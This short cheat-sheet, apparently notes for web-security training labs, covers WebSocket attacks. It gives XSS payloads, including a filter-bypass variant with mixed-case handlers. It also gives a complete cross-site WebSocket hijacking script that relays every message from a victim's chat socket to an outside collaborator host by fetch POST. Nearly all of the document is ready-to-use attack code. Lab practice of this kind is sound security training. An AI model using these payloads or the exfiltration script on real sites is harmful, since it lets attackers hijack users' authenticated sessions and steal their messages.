### Manipulating WebSocket messages
    For XSS: <img src=1 onerror='alert(1)'>
    To bypass XSS filter: <img src=1 oNeRrOr=alert`1`>
### Cross-site WebSocket hijacking
####  Exploit
```js
<script>
    var ws = new WebSocket('wss://0a820003036953d283898de6004b0013.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://agus9fqks1acunox6p9wrogmndt4hv5k.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
